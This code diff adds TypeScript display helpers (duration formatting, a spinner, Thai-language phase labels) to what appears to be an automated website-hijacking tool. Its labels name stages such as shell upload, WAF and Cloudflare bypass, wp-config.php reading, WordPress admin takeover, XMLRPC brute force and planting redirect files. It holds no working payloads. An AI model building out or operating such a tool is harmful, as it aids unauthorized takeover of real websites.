+function formatDurationThai(ms: number): string {
+  if (ms < 1000) return `${ms}ms`;
+  if (ms < 60000) return `${(ms / 1000).toFixed(1)}s`;
+  const mins = Math.floor(ms / 60000);
+  const secs = Math.round((ms % 60000) / 1000);
+  return `${mins}m ${secs}s`;
+}
+
+function buildSpinner(elapsed: number): string {
+  const frames = ["◐", "◓", "◑", "◒"];
+  return frames[Math.floor(elapsed / 500) % frames.length];
+}
+
+function sleep(ms: number): Promise<void> {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+function mapPhaseToThaiLabel(phase: string): string {
+  const map: Record<string, string> = {
+    ai_analysis: "🤖 AI วิเคราะห์เป้าหมาย",
+    prescreen: "🔍 Pre-screen ตรวจสอบเบื้องต้น",
+    vuln_scan: "🔎 สแกนช่องโหว่",
+    shell_gen: "🛠 สร้าง Shell/Payload",
+    upload: "📤 อัปโหลดไฟล์",
+    verify: "✅ ตรวจสอบผลลัพธ์",
+    complete: "🏁 เสร็จสิ้น",
+    error: "❌ ข้อผิดพลาด",
+    waf_bypass: "🛡 Bypass WAF/Firewall",
+    alt_upload: "📤 อัปโหลดทางเลือก",
+    indirect: "🔄 โจมตีทางอ้อม",
+    dns_attack: "🌐 DNS Attack",
+    config_exploit: "⚙️ อ่าน wp-config.php",
+    recon: "🔍 สำรวจเป้าหมาย",
+    cloaking: "🎭 Cloaking Injection",
+    wp_admin: "🔐 WP Admin Takeover",
+    wp_db_inject: "💉 WP Database Injection",
+    wp_brute_force: "🔨 WP Brute Force",
+    post_upload: "📝 Post Upload",
+    comprehensive: "💥 Comprehensive Attack",
+    smart_fallback: "🧠 Smart Fallback",
+    cf_bypass: "☁️ Cloudflare Bypass",
+    shellless: "🚫 Shellless Attack",
+    email: "📧 Email Attack",
+    world_update: "🌍 World Update",
+  };
+  return map[phase] || `📋 ${phase}`;
+}
+
+function mapPhaseToThaiAnalysis(phase: string, detail: string): string {
+  // Extract key info from detail and translate to Thai
+  if (detail.includes("✅") || detail.includes("success")) {
+    return `สำเร็จ: ${detail.replace(/[✅❌]/g, "").trim().substring(0, 80)}`;
+  }
+  if (detail.includes("❌") || detail.includes("fail") || detail.includes("error")) {
+    return `ไม่สำเร็จ: ${detail.replace(/[✅❌]/g, "").trim().substring(0, 80)}`;
+  }
+  return detail.substring(0, 80);
+}
+
+function mapDetailToThai(phase: string, detail: string): string | null {
+  // Only generate analysis for significant events
+  if (detail.length < 15) return null;
+  
+  // Translate common patterns
+  if (detail.includes("WordPress")) {
+    if (detail.includes("detected") || detail.includes("found")) {
+      return "พบว่าเว็บไซต์ใช้ WordPress — เหมาะสำหรับการโจมตีด้วย XMLRPC multicall และ REST API";
+    }
+    if (detail.includes("not found") || detail.includes("not detected")) {
+      return "ไม่พบ WordPress — ต้องใช้วิธีโจมตีแบบอื่น";
+    }
+  }
+  
+  if (detail.includes("WAF") || detail.includes("firewall")) {
+    return "ตรวจพบ WAF/Firewall — กำลังใช้เทคนิค bypass";
+  }
+  
+  if (detail.includes("upload") && detail.includes("success")) {
+    return "อัปโหลดไฟล์สำเร็จ — กำลังตรวจสอบว่า redirect ทำงานหรือไม่";
+  }
+  
+  if (detail.includes("brute") && detail.includes("found")) {
+    return "พบรหัสผ่าน! กำลังเข้าสู่ระบบและวางไฟล์ redirect";
+  }
+  
+  if (detail.includes("Cloudflare")) {
+    return "เว็บอยู่หลัง Cloudflare — ต้องใช้เทคนิค bypass พิเศษ";
+  }
+  
+  // Return null for non-significant events
+  return null;
+}
+
+function mapHijackMethodToThai(method: string): string {
+  const map: Record<string, string> = {
+    xmlrpc_brute: "🔨 XMLRPC Brute Force",
+    rest_api_editor: "📝 REST API Theme Editor",
+    phpmyadmin: "🗄 PHPMyAdmin",
+    mysql_direct: "💾 MySQL Direct",
+    ftp_access: "📁 FTP Access",
+    cpanel_filemanager: "🖥 cPanel File Manager",
+  };
+  return map[method] || method;
+}
